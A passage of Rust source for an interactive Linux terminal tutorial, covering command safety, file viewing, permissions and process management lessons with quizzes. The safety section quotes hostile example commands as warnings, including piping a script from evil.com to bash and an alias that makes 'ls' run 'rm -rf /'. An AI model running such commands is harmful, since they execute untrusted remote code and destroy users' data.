                    explanation: "CORRECT! Always READ and UNDERSTAND commands first!\n\nInternet command safety:\n\n❌ Malicious examples you might see:\n   • curl evil.com/script | bash  (runs hidden malware!)\n   • alias ls='rm -rf /'  (makes 'ls' destroy your system!)\n   • Hidden characters that do something different than shown\n\n✅ Safe practices:\n   1️⃣  READ every part of the command\n   2️⃣  Look up unfamiliar commands with 'man' or '--help'\n   3️⃣  TYPE commands yourself (don't copy-paste!)\n   4️⃣  Be skeptical of commands that:\n      • Use sudo unnecessarily\n      • Pipe curl/wget to bash\n      • Have > redirects to system files\n      • Use rm, chmod, or other dangerous commands\n   5️⃣  Only trust official documentation\n\nWhen in doubt, ask an expert or research more!".to_string(),
                },
            },
            LessonStep {
                step_number: 9,
                title: "File System Navigation Mistakes".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "🗺️  ALWAYS KNOW WHERE YOU ARE!\n\nCommon navigation mistakes:\n\n❌ Running destructive commands without checking location:\n   pwd  ← Always do this first!\n   # Oh no, I'm in / not /tmp!\n\n❌ Typos in paths with destructive commands:\n   cd /tmpp/work     ← Failed (typo)\n   rm -rf *          ← Just deleted wrong directory!\n\n❌ Assuming you're in the right directory:\n   cd ~/projects/myapp\n   # ...later...\n   rm -rf node_modules  ← Are you still in myapp?\n\nSafe practices:\n\n✅ Always 'pwd' before destructive operations\n✅ Use absolute paths for important operations:\n   rm -rf /tmp/test instead of cd /tmp && rm -rf test\n✅ Use tab completion to avoid typos\n✅ Create a habit: 'pwd' → 'ls' → then act\n✅ Be extra careful in /tmp, /, and system directories".to_string(),
                },
            },
            LessonStep {
                step_number: 10,
                title: "Hidden Files and Spaces in Names".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "👻 WATCH OUT FOR HIDDEN FILES AND SPACES!\n\nHidden file dangers:\n\n❌ rm -rf * → Deletes visible files only\n❌ rm -rf * .* → DANGEROUS! .* matches .. (parent directory!)\n✅ rm -rf * .[^.]* → Safe way to include hidden files\n\nSpaces in filenames:\n\n❌ rm my file.txt → Tries to delete 'my' and 'file.txt'\n✅ rm \"my file.txt\" → Correct (quotes protect spaces)\n✅ rm my\\ file.txt → Also correct (backslash escapes space)\n✅ Use tab completion to auto-escape spaces!\n\nOther tricky characters:\n\n❌ Files starting with - (dash) confuse commands:\n   rm -file.txt → Thinks it's a flag!\n   ✅ rm ./-file.txt → Correct way\n\n❌ Files with special characters: !@#$%^&*()\n   ✅ Always use quotes or escape them\n\nBest practice: Avoid spaces in filenames! Use underscores or dashes:\n  my-file.txt or my_file.txt".to_string(),
                },
            },
            LessonStep {
                step_number: 11,
                title: "Environment Variable Dangers".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "🔧 BE CAREFUL WITH ENVIRONMENT VARIABLES!\n\nDangerous modifications:\n\n❌ export PATH=/usr/bin\n   • Overwrites entire PATH (breaks most commands!)\n   ✅ export PATH=$PATH:/usr/bin (appends instead)\n\n❌ unset PATH\n   • Makes most commands unusable!\n\n❌ Adding untrusted directories to PATH:\n   export PATH=/tmp:$PATH\n   • Now malicious /tmp/ls could run instead of real ls!\n\nSystem file dangers:\n\n❌ NEVER edit these without understanding them:\n   • /etc/passwd → User accounts\n   • /etc/fstab → Disk mounting (can prevent boot!)\n   • /etc/hosts → Network resolution\n   • /boot/* → Boot files (can break booting!)\n\n✅ Safe practices:\n   • Always backup before editing: sudo cp /etc/passwd /etc/passwd.bak\n   • Use proper editors: sudo vi /etc/hosts\n   • Test changes in your home directory first\n   • Keep recovery USB drive handy!".to_string(),
                },
            },
            LessonStep {
                step_number: 12,
                title: "Completion: Safety Knowledge Acquired!".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "🎓 CONGRATULATIONS! You're now aware of major dangers!\n\n🛡️  GOLDEN RULES TO REMEMBER:\n\n1️⃣  NEVER run 'rm -rf /' or 'rm -rf /*'\n2️⃣  ALWAYS use -i flag with rm, mv, cp\n3️⃣  NEVER use chmod 777 on anything\n4️⃣  ALWAYS read commands before running them\n5️⃣  NEVER blindly copy-paste from the internet\n6️⃣  ALWAYS pwd before destructive operations\n7️⃣  NEVER pipe curl to bash without reading the script\n8️⃣  ALWAYS use sudo minimally and carefully\n9️⃣  NEVER assume you're in the right directory\n🔟 ALWAYS backup important files before operations\n\n💡 When in doubt:\n  • man <command> → Read the manual\n  • <command> --help → Get help info\n  • Ask in forums/communities\n  • Test in /tmp or virtual machine first\n  • Make backups before experimenting\n\nStay safe and enjoy the power of the command line! 🚀\n\nNext: Practice these lessons in safe environments!".to_string(),
                },
            },
        ],
    }
}

/// Create the "File Viewing & Reading" lesson
fn create_file_viewing_lesson() -> Lesson {
    Lesson {
        id: "file-viewing".to_string(),
        title: "File Viewing & Reading".to_string(),
        description: "Master the art of reading, viewing, and searching through text files using cat, less, head, tail, and grep.".to_string(),
        difficulty: Difficulty::Beginner,
        estimated_minutes: 12,
        prerequisites: vec!["nav-basics".to_string()],
        tags: vec!["beginner".to_string(), "files".to_string(), "text".to_string()],
        setup: vec![
            SetupFile {
                path: "notes.txt".to_string(),
                contents: "Shopping list:\n- apples\n- bread\n- coffee\n\nReminder: practice cat, less, head, tail and grep on the files here.\n".to_string(),
            },
            SetupFile {
                path: "server.log".to_string(),
                contents: "2026-07-01 09:00:01 INFO  http server started on port 8080\n\
2026-07-01 09:00:02 INFO  ssh daemon listening on port 22\n\
2026-07-01 09:01:14 INFO  http GET /index.html 200\n\
2026-07-01 09:02:33 WARN  http GET /admin 403\n\
2026-07-01 09:03:05 INFO  SSH login accepted for user alice\n\
2026-07-01 09:04:41 ERROR http GET /missing 404\n\
2026-07-01 09:05:12 INFO  http GET /about.html 200\n\
2026-07-01 09:06:58 WARN  disk usage at 81%\n\
2026-07-01 09:07:23 INFO  http POST /contact 200\n\
2026-07-01 09:08:44 ERROR ssh login failed for user bob\n\
2026-07-01 09:09:31 INFO  http GET /index.html 200\n\
2026-07-01 09:10:02 INFO  backup job started\n\
2026-07-01 09:12:19 INFO  backup job finished\n\
2026-07-01 09:13:37 INFO  http GET /docs 200\n\
2026-07-01 09:14:55 ERROR http GET /broken 500\n\
2026-07-01 09:15:10 INFO  SSH session closed for user alice\n\
2026-07-01 09:16:42 INFO  http GET /index.html 200\n\
2026-07-01 09:17:08 WARN  slow query took 4.2s\n\
2026-07-01 09:18:29 INFO  http GET /blog 200\n\
2026-07-01 09:19:59 INFO  server heartbeat OK\n".to_string(),
            },
            SetupFile {
                path: "poem.txt".to_string(),
                contents: "The terminal glows in quiet night,\nEach command a spark of light.\nWith cat and grep the text takes flight,\nAnd tail reveals the end in sight.\n".to_string(),
            },
        ],
        steps: vec![
            LessonStep {
                step_number: 1,
                title: "Introduction to File Viewing".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Welcome to File Viewing & Reading!\n\nIn Linux, almost everything is a text file - configuration files, logs, scripts, and more. Knowing how to quickly read and search through files is essential.\n\nYou'll learn:\n  • cat - Display entire files\n  • less - Navigate large files\n  • head/tail - View file beginnings and ends\n  • grep - Search for patterns in files\n\nThese tools are your windows into the file system. Let's get started!".to_string(),
                },
            },
            LessonStep {
                step_number: 2,
                title: "Using cat to Display Files".to_string(),
                instruction: "The 'cat' command (concatenate) displays file contents. Try viewing a file with cat /etc/hostname".to_string(),
                hint: Some("Type: cat /etc/hostname".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "cat /etc/hostname".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Perfect! 'cat' dumps the entire file to your screen. Great for small files, but overwhelming for large ones.".to_string(),
                },
            },
            LessonStep {
                step_number: 3,
                title: "Viewing Multiple Files".to_string(),
                instruction: "cat can display multiple files at once. Try: cat /etc/hostname /etc/os-release".to_string(),
                hint: Some("Type exactly: cat /etc/hostname /etc/os-release".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "cat /etc/hostname /etc/os-release".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Excellent! cat concatenates (combines) multiple files and displays them in order. That's why it's called 'cat'!".to_string(),
                },
            },
            LessonStep {
                step_number: 4,
                title: "Reading Large Files with less".to_string(),
                instruction: "For large files, use 'less' which lets you scroll. It's like a book reader. Try: less /etc/services".to_string(),
                hint: Some("Type: less /etc/services (use arrow keys to scroll, 'q' to quit)".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "less /etc/services".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Great! In less: arrow keys scroll, Space=page down, 'b'=page up, '/'=search, 'q'=quit. It's named 'less' because 'less is more' (improving on the old 'more' command).".to_string(),
                },
            },
            LessonStep {
                step_number: 5,
                title: "Quiz: When to Use cat vs less?".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "When should you use 'less' instead of 'cat'?".to_string(),
                    options: vec![
                        "Always use cat, it's faster".to_string(),
                        "For large files where you need to scroll and search".to_string(),
                        "Only for binary files".to_string(),
                        "When you want to edit the file".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "Correct! Use 'less' for large files (logs, documentation) where you need to scroll and search. Use 'cat' for quick viewing of small files or when piping to other commands. Neither cat nor less can edit files - use a text editor like nano or vim for that!".to_string(),
                },
            },
            LessonStep {
                step_number: 6,
                title: "Viewing File Beginnings with head".to_string(),
                instruction: "To see just the first few lines of a file, use 'head'. Try viewing the first 10 lines of /etc/services".to_string(),
                hint: Some("Type: head /etc/services".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "head /etc/services".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Perfect! By default, 'head' shows the first 10 lines. Great for previewing files or checking log file headers.".to_string(),
                },
            },
            LessonStep {
                step_number: 7,
                title: "Custom Line Count with head".to_string(),
                instruction: "You can specify how many lines to show with -n. Try showing the first 5 lines: head -n 5 /etc/services".to_string(),
                hint: Some("Type: head -n 5 /etc/services".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "head -n 5 /etc/services".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Excellent! The -n flag controls the number of lines. You can also use the shorthand: head -5 /etc/services".to_string(),
                },
            },
            LessonStep {
                step_number: 8,
                title: "Viewing File Endings with tail".to_string(),
                instruction: "To see the last lines of a file, use 'tail'. This is crucial for checking log files. Try: tail /etc/services".to_string(),
                hint: Some("Type: tail /etc/services".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "tail /etc/services".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Great! 'tail' shows the last 10 lines by default. Essential for checking recent log entries!".to_string(),
                },
            },
            LessonStep {
                step_number: 9,
                title: "Live Log Monitoring".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Pro tip: tail -f (follow mode)\n\nThe -f flag makes tail continuously show new lines as they're added to a file:\n\n  tail -f /var/log/syslog\n\nThis is INCREDIBLY useful for:\n  • Monitoring live log files\n  • Watching application output\n  • Debugging server issues\n  • Tracking file changes in real-time\n\nPress Ctrl+C to stop following.\n\nExample: tail -f /var/log/nginx/access.log\nWatches web server traffic in real-time!".to_string(),
                },
            },
            LessonStep {
                step_number: 10,
                title: "Introduction to grep".to_string(),
                instruction: "grep searches for patterns in files. It's like Ctrl+F for the command line. Search for 'http' in /etc/services: grep http /etc/services".to_string(),
                hint: Some("Type: grep http /etc/services".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "grep http /etc/services".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Perfect! grep found all lines containing 'http'. Each matching line is displayed with the pattern highlighted.".to_string(),
                },
            },
            LessonStep {
                step_number: 11,
                title: "Case-Insensitive Search".to_string(),
                instruction: "By default, grep is case-sensitive. Use -i for case-insensitive search. Try: grep -i SSH /etc/services".to_string(),
                hint: Some("Type: grep -i SSH /etc/services".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "grep -i SSH /etc/services".to_string(),
                    validation: CommandValidation::AnyOf(vec![
                        "grep -i SSH /etc/services".to_string(),
                        "grep -i ssh /etc/services".to_string(),
                    ]),
                    success_message: "Excellent! The -i flag makes grep ignore case, matching 'SSH', 'ssh', 'Ssh', etc. Very useful when you're not sure of the exact capitalization.".to_string(),
                },
            },
            LessonStep {
                step_number: 12,
                title: "Completion: File Viewing Mastered!".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Congratulations! You've mastered file viewing!\n\nKey commands learned:\n  • cat file.txt           - Display entire file\n  • cat file1 file2        - Display multiple files\n  • less file.txt          - Navigate large files (q to quit)\n  • head file.txt          - First 10 lines\n  • head -n 20 file.txt    - First 20 lines\n  • tail file.txt          - Last 10 lines\n  • tail -f file.txt       - Follow file (live updates)\n  • grep pattern file      - Search for pattern\n  • grep -i pattern file   - Case-insensitive search\n\nQuick reference:\n  Small files? → cat\n  Large files? → less\n  Check beginning? → head\n  Check end/logs? → tail\n  Find something? → grep\n  Watch live logs? → tail -f\n\nNext lesson: Learn text processing with pipes and filters!".to_string(),
                },
            },
        ],
    }
}

/// Create the "Permissions & Ownership" lesson
fn create_permissions_lesson() -> Lesson {
    Lesson {
        id: "permissions".to_string(),
        title: "Permissions & Ownership".to_string(),
        description: "Understand Linux file permissions, ownership, and how to modify them safely using chmod and chown.".to_string(),
        difficulty: Difficulty::Intermediate,
        estimated_minutes: 15,
        prerequisites: vec!["nav-basics".to_string(), "file-mgmt".to_string()],
        tags: vec!["intermediate".to_string(), "permissions".to_string(), "security".to_string()],
        setup: vec![],
        steps: vec![
            LessonStep {
                step_number: 1,
                title: "Understanding Linux Permissions".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Welcome to Permissions & Ownership!\n\nLinux is a multi-user system. Permissions control who can read, write, or execute files.\n\nWhen you run 'ls -l', you see something like:\n  -rw-r--r-- 1 user group 1234 Nov 16 10:30 file.txt\n\nLet's decode this:\n  -rw-r--r--  ← Permissions (10 characters)\n  1           ← Number of hard links\n  user        ← Owner\n  group       ← Group\n  1234        ← Size in bytes\n  Nov 16...   ← Last modified date/time\n  file.txt    ← Filename\n\nWe'll focus on permissions and ownership. Understanding this is crucial for security!".to_string(),
                },
            },
            LessonStep {
                step_number: 2,
                title: "Viewing Permissions".to_string(),
                instruction: "First, let's see permissions in action. Use 'ls -l' to view detailed file information in your home directory.".to_string(),
                hint: Some("Type: ls -l".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "ls -l".to_string(),
                    validation: CommandValidation::CommandOnly,
                    success_message: "Great! Look at the first column - those cryptic letters are the permissions. Let's decode them!".to_string(),
                },
            },
            LessonStep {
                step_number: 3,
                title: "Decoding Permission Strings".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Understanding the 10-character permission string:\n\n  -rw-r--r--\n  ↑↑↑↑↑↑↑↑↑↑\n  │││││││││└─ Others: read\n  ││││││││└── Others: write (no)\n  │││││││└─── Others: execute (no)\n  ││││││└──── Group: read\n  │││││└───── Group: write (no)\n  ││││└────── Group: execute (no)\n  │││└─────── Owner: read\n  ││└──────── Owner: write\n  │└───────── Owner: execute (no)\n  └────────── File type (- = file, d = directory, l = link)\n\nThree permission types:\n  r = read (4)    - View file contents\n  w = write (2)   - Modify or delete\n  x = execute (1) - Run as program/script\n\nThree permission groups:\n  Owner → Group → Others (everyone else)".to_string(),
                },
            },
            LessonStep {
                step_number: 4,
                title: "Quiz: Reading Permissions".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "A file has permissions '-rwxr-x---'. What can the group do?".to_string(),
                    options: vec![
                        "Read, write, and execute".to_string(),
                        "Read and execute only".to_string(),
                        "Execute only".to_string(),
                        "Nothing - no permissions".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "Correct! Breaking it down: -rwxr-x---\nOwner (rwx) can do everything. Group (r-x) can read and execute but NOT write. Others (---) have no permissions at all. The middle set of three characters (r-x) represents group permissions.".to_string(),
                },
            },
            LessonStep {
                step_number: 5,
                title: "Numeric Permission Notation".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Permissions can be expressed as numbers!\n\nEach permission has a value:\n  r (read)    = 4\n  w (write)   = 2\n  x (execute) = 1\n  - (none)    = 0\n\nAdd them up for each group:\n  rwx = 4+2+1 = 7 (all permissions)\n  rw- = 4+2+0 = 6 (read + write)\n  r-x = 4+0+1 = 5 (read + execute)\n  r-- = 4+0+0 = 4 (read only)\n  --- = 0+0+0 = 0 (no permissions)\n\nCommon permission sets:\n  644 = rw-r--r-- (owner writes, others read)\n  755 = rwxr-xr-x (owner writes, all execute)\n  600 = rw------- (owner only, private file)\n  777 = rwxrwxrwx (DANGEROUS - everyone can do everything!)\n\nExample: -rw-r--r-- = 644".to_string(),
                },
            },
            LessonStep {
                step_number: 6,
                title: "Quiz: Numeric Permissions".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "What does 'chmod 755 script.sh' do?".to_string(),
                    options: vec![
                        "Owner: read only, Group/Others: read + execute".to_string(),
                        "Owner: all permissions, Group/Others: read + execute".to_string(),
                        "Everyone: all permissions (dangerous!)".to_string(),
                        "Owner: read + write, Group/Others: read only".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "Correct! 755 means:\n  7 (owner) = rwx = 4+2+1 = full control\n  5 (group) = r-x = 4+0+1 = read and execute\n  5 (others) = r-x = 4+0+1 = read and execute\n\nThis is perfect for scripts and executables - the owner can modify it, but everyone can run it. Common for programs in /usr/bin!".to_string(),
                },
            },
            LessonStep {
                step_number: 7,
                title: "Using chmod with Numbers".to_string(),
                instruction: "Let's practice! First, create a test file: touch testfile.txt, then set its permissions to 644: chmod 644 testfile.txt".to_string(),
                hint: Some("Type two commands: touch testfile.txt then chmod 644 testfile.txt".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "chmod 644 testfile.txt".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Perfect! You've set the file to rw-r--r-- (644). You can write to it, but others can only read. This is the standard for regular files.".to_string(),
                },
            },
            LessonStep {
                step_number: 8,
                title: "Using chmod with Symbolic Notation".to_string(),
                instruction: "You can also use letters! Make testfile.txt executable for the owner: chmod u+x testfile.txt".to_string(),
                hint: Some("Type: chmod u+x testfile.txt (u=user/owner, +x=add execute)".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "chmod u+x testfile.txt".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Excellent! Symbolic notation is intuitive:\n  u=user/owner, g=group, o=others, a=all\n  +=add, -=remove, ==set exactly\n  r=read, w=write, x=execute\n\nExamples: chmod g+w file (group can write), chmod o-r file (others can't read)".to_string(),
                },
            },
            LessonStep {
                step_number: 9,
                title: "Making Scripts Executable".to_string(),
                instruction: "Common task: making a script runnable. Use the shorthand to add execute permission for everyone: chmod +x testfile.txt".to_string(),
                hint: Some("Type: chmod +x testfile.txt (no u/g/o means 'all')".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "chmod +x testfile.txt".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Great! When you omit u/g/o, it applies to all. 'chmod +x' is the quickest way to make a script executable. Now you could run it with ./testfile.txt (if it were a script).".to_string(),
                },
            },
            LessonStep {
                step_number: 10,
                title: "Understanding Ownership".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "File Ownership in Linux:\n\nEvery file has TWO owners:\n  1. User owner (usually who created it)\n  2. Group owner (for sharing among team members)\n\nIn 'ls -l' output:\n  -rw-r--r-- 1 alice developers 1234 Nov 16 file.txt\n              ↑     ↑\n              user  group\n\nWhy does this matter?\n  • Users in 'developers' group get the group permissions\n  • Everyone else gets the 'others' permissions\n  • Only root (admin) or the owner can change ownership\n\nCommon use case:\n  Web server files owned by 'www-data' user and group\n  Log files owned by 'syslog' user for security".to_string(),
                },
            },
            LessonStep {
                step_number: 11,
                title: "Changing Ownership with chown".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "The chown command changes file ownership:\n\nSyntax:\n  chown user:group file.txt\n  chown user file.txt        (just change user)\n  chown :group file.txt      (just change group)\n\nExamples:\n  sudo chown alice:developers file.txt\n  sudo chown www-data:www-data /var/www/index.html\n  sudo chown -R user:group /path/to/directory  (-R = recursive)\n\nIMPORTANT:\n  • Usually requires sudo (only root can change ownership)\n  • Be careful with -R (recursive) - affects all files inside!\n  • Don't change ownership of system files unless you know what you're doing\n\nFor practice, you typically don't need chown on your own files.\nYou're already the owner!".to_string(),
                },
            },
            LessonStep {
                step_number: 12,
                title: "Quiz: Permission Safety".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "Why should you NEVER use 'chmod 777' on files?".to_string(),
                    options: vec![
                        "It's too complicated to type".to_string(),
                        "It gives EVERYONE full read, write, execute access - a security nightmare!".to_string(),
                        "It makes files read-only".to_string(),
                        "It only works on directories".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "CORRECT! chmod 777 = rwxrwxrwx means EVERYONE on the system can read, modify, delete, and execute your file. This is a massive security risk!\n\nNever use 777! Instead:\n  • 644 for regular files (rw-r--r--)\n  • 755 for scripts/executables (rwxr-xr-x)\n  • 600 for private files (rw-------)\n  • 700 for private scripts (rwx------)\n\nUse minimal permissions needed. It's the principle of least privilege!".to_string(),
                },
            },
            LessonStep {
                step_number: 13,
                title: "Completion: Permissions Mastered!".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Excellent work! You understand Linux permissions!\n\nKey concepts:\n  • Three permission types: read (r), write (w), execute (x)\n  • Three groups: owner, group, others\n  • Numeric notation: 644, 755, 600, 700\n  • Symbolic notation: u+x, g-w, o=r\n\nEssential commands:\n  ls -l                  View permissions\n  chmod 644 file         Set permissions (numeric)\n  chmod u+x file         Add execute for owner (symbolic)\n  chmod +x file          Make executable for all\n  chown user:group file  Change ownership (needs sudo)\n\nSafety rules:\n  ✓ Never chmod 777 (security risk!)\n  ✓ Use minimal permissions needed\n  ✓ 644 for files, 755 for executables\n  ✓ 600/700 for private data\n  ✓ Be careful with -R (recursive)\n\nNext: Learn process management!".to_string(),
                },
            },
        ],
    }
}

/// Create the "Process Management" lesson
fn create_process_management_lesson() -> Lesson {
    Lesson {
        id: "process-mgmt".to_string(),
        title: "Process Management".to_string(),
        description: "Learn to monitor and control running processes using ps, top, kill, and background job management.".to_string(),
        difficulty: Difficulty::Intermediate,
        estimated_minutes: 15,
        prerequisites: vec!["nav-basics".to_string()],
        tags: vec!["intermediate".to_string(), "processes".to_string(), "system".to_string()],
        setup: vec![],
        steps: vec![
            LessonStep {
                step_number: 1,
                title: "Introduction to Processes".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Welcome to Process Management!\n\nA 'process' is a running program. Every command you execute becomes a process. Your system runs hundreds of processes simultaneously.\n\nKey concepts:\n  • PID (Process ID) - Unique number for each process\n  • Parent/Child - Processes can spawn other processes\n  • Foreground - Process using your terminal\n  • Background - Process running without blocking terminal\n  • Zombie - Dead process that hasn't been cleaned up\n\nYou'll learn to:\n  • View running processes\n  • Monitor system resources\n  • Kill misbehaving processes\n  • Run tasks in the background\n\nLet's dive in!".to_string(),
                },
            },
            LessonStep {
                step_number: 2,
                title: "Viewing Your Processes".to_string(),
                instruction: "The 'ps' command shows running processes. Try it: ps".to_string(),
                hint: Some("Type: ps".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "ps".to_string(),
                    validation: CommandValidation::CommandOnly,
                    success_message: "Good! You see a short list of processes in your current terminal. But there's much more happening! Let's see everything.".to_string(),
                },
            },
            LessonStep {
                step_number: 3,
                title: "Viewing All Processes".to_string(),
                instruction: "To see ALL processes on the system, use: ps aux (a=all users, u=user-oriented format, x=include processes without terminals)".to_string(),
                hint: Some("Type: ps aux".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "ps aux".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Wow! Look at all those processes! Each line shows: USER, PID, CPU%, MEM%, COMMAND. This is a snapshot of your entire system.".to_string(),
                },
            },
            LessonStep {
                step_number: 4,
                title: "Understanding ps Output".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Decoding 'ps aux' output:\n\nUSER    PID %CPU %MEM    VSZ   RSS TTY   STAT START   TIME COMMAND\nroot      1  0.0  0.1 168580 12140 ?     Ss   Nov15   0:01 /sbin/init\n\nColumns explained:\n  USER  - Who owns the process\n  PID   - Process ID (unique identifier)\n  %CPU  - CPU usage percentage\n  %MEM  - Memory usage percentage\n  VSZ   - Virtual memory size (KB)\n  RSS   - Resident memory size (KB, actual RAM used)\n  TTY   - Terminal (? means no terminal)\n  STAT  - Process state:\n          S = Sleeping (waiting)\n          R = Running\n          Z = Zombie (dead but not cleaned up)\n          T = sTopped\n          s = session leader\n          + = foreground process\n  START - When process started\n  TIME  - CPU time used\n  COMMAND - The actual command/program".to_string(),
                },
            },
            LessonStep {
                step_number: 5,
                title: "Quiz: Process States".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "A process shows state 'Z' in ps output. What does this mean?".to_string(),
                    options: vec![
                        "The process is running normally".to_string(),
                        "The process is asleep/waiting".to_string(),
                        "It's a zombie - process finished but parent hasn't collected its exit status".to_string(),
                        "The process is using zero CPU".to_string(),
                    ],
                    correct_index: 2,
                    explanation: "Correct! A 'Z' (zombie) process has completed execution but its parent hasn't read its exit status yet. They usually clean up quickly. If you see many zombies, the parent process might be buggy. Zombies don't use resources but indicate a problem.".to_string(),
                },
            },
            LessonStep {
                step_number: 6,
                title: "Real-Time Monitoring with top".to_string(),
                instruction: "The 'top' command shows processes in real-time, updating every few seconds. Try it: top".to_string(),
                hint: Some("Type: top (press 'q' to quit when you're done looking)".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "top".to_string(),
                    validation: CommandValidation::CommandOnly,
                    success_message: "Great! 'top' is like a live dashboard. It shows:\n  • Top section: system summary (CPU, memory, uptime)\n  • Bottom: processes sorted by CPU usage\n  • Press 'M' to sort by memory, 'P' for CPU, 'q' to quit\n  • Press 'k' to kill a process by PID".to_string(),
                },
            },
            LessonStep {
                step_number: 7,
                title: "Finding Specific Processes".to_string(),
                instruction: "To find a specific process, combine ps with grep. Try searching for bash processes: ps aux | grep bash".to_string(),
                hint: Some("Type: ps aux | grep bash".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "ps aux | grep bash".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Perfect! The pipe (|) sends ps output to grep, which filters for lines containing 'bash'. This is how you find specific running programs. Note: you'll also see the grep command itself in the results!".to_string(),
                },
            },
            LessonStep {
                step_number: 8,
                title: "Killing Processes Safely".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "The 'kill' command sends signals to processes.\n\nCommon signals:\n  kill PID          - SIGTERM (15) - Polite request to terminate\n  kill -9 PID       - SIGKILL (9) - Force kill (cannot be ignored)\n  kill -1 PID       - SIGHUP (1) - Hangup, often reloads config\n  kill -STOP PID    - Pause process\n  kill -CONT PID    - Resume paused process\n\nBest practice:\n  1. Try 'kill PID' first (gives process chance to cleanup)\n  2. Wait a few seconds\n  3. If still running, use 'kill -9 PID' (force kill)\n\nALTERNATIVES:\n  pkill firefox     - Kill by name (all matching processes)\n  killall firefox   - Same as pkill\n  kill -9 -1        - Kill all your processes (dangerous!)\n\nWarning: Only kill your own processes unless you're root!".to_string(),
                },
            },
            LessonStep {
                step_number: 9,
                title: "Quiz: Killing Processes".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "A program is frozen. What's the safest way to kill it?".to_string(),
                    options: vec![
                        "Immediately use 'kill -9 PID'".to_string(),
                        "Try 'kill PID' first, then 'kill -9 PID' if it doesn't work".to_string(),
                        "Use 'pkill -9' to kill all processes with that name".to_string(),
                        "Restart the computer".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "Correct! Always try the polite 'kill PID' (SIGTERM) first. This allows the program to:\n  • Save data\n  • Close files properly\n  • Clean up resources\n  • Shutdown gracefully\n\nOnly use 'kill -9' (SIGKILL) if the process doesn't respond to SIGTERM. SIGKILL cannot be caught or ignored - it's an immediate termination with no cleanup.".to_string(),
                },
            },
            LessonStep {
                step_number: 10,
                title: "Running Commands in Background".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Background jobs let you multitask in the terminal!\n\nRunning in background:\n  command &             - Run command in background\n  sleep 60 &            - Example: sleep for 60 seconds in background\n\nManaging jobs:\n  jobs                  - List background jobs\n  fg                    - Bring last job to foreground\n  fg %1                 - Bring job 1 to foreground\n  bg                    - Resume paused job in background\n  Ctrl+Z                - Pause current foreground job\n  Ctrl+C                - Kill current foreground job\n\nPractical workflow:\n  1. Start: command &\n  2. Check: jobs\n  3. Bring to front: fg %1\n  4. Pause: Ctrl+Z\n  5. Resume in back: bg\n\nExample:\n  $ sleep 100 &\n  [1] 12345         ← Job 1, PID 12345\n  $ jobs\n  [1]+ Running     sleep 100 &".to_string(),
                },
            },
            LessonStep {
                step_number: 11,
                title: "Understanding Process Priority".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
